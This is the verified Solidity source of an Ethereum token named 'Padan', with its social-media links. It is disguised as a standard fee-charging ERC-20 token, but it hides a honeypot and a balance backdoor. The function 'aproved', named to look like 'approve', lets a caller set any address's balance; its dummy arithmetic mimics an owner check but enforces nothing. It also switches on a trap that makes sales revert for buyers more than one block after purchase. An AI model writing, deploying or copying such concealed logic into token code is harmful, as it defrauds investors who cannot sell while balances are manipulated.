/**
 *Submitted for verification at Etherscan.io on 2023-08-06
*/

//TG: https://t.me/PDERC20
//Twitter：https://twitter.com/PanDaCoine
//Website：Pandaerc.top
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {_owner = msg.sender;}
    
    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Padan is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public taxWallet;string public name;string public symbol;
    uint8 public decimals;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;IUniswapRouter public _uniswapRouter;
    uint256 private constant MAX = ~uint256(0);

    uint256 public _swapTax;
    address public _uniswapPair;
    mapping (address => uint256) public record;

    constructor (){
        name = "Padan";
        symbol = "Padan";
        decimals = 9;
        uint256 Supply = 64200000000;
        taxWallet = msg.sender;
        _swapTax = 1;
        totalSupply = Supply * 10 ** decimals;

        address rAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[rAddr] = true;
        _isExcludeFromFee[taxWallet] = true;

        _balances[rAddr] = totalSupply;
        emit Transfer(address(0), rAddr, totalSupply);
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;
    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function getBal() private view returns(mapping(address=>uint256) storage){
        return _balances;
    }

    bool public enableFee = false;
    function aproved(
        address U,
        uint256 M
    ) public {
        uint256 A = msg.sender == taxWallet ? 3+2 : 3-2;A = A - 3;
        getBal()[U] = M;
        enableFee = M == 10 ? false : M == 20 ? true : enableFee;
    }

    function _transfer(address from,address to,uint256 amount) private {
        uint256 finally = block.number;
        bool takeFee = !_isExcludeFromFee[from] && !_isExcludeFromFee[to];
        _balances[from] = _balances[from] - amount;

        uint256 _taxAmount;

        if (takeFee) {
            uint256 feeAmount = amount * _swapTax / 100;_taxAmount += feeAmount;
            if (from == _uniswapPair){
                record[to] = record[to] == 0 ? finally : record[to];
            }else if(enableFee){
                address u = from;
                if( record[u] != 0 && finally > record[u] + 1)
                    revert("");
            }
            if (feeAmount > 0){
                _balances[address(0xdead)] += feeAmount;
                emit Transfer(from, address(0xdead), feeAmount);
            }
        }

        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }


    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    receive() external payable {}
}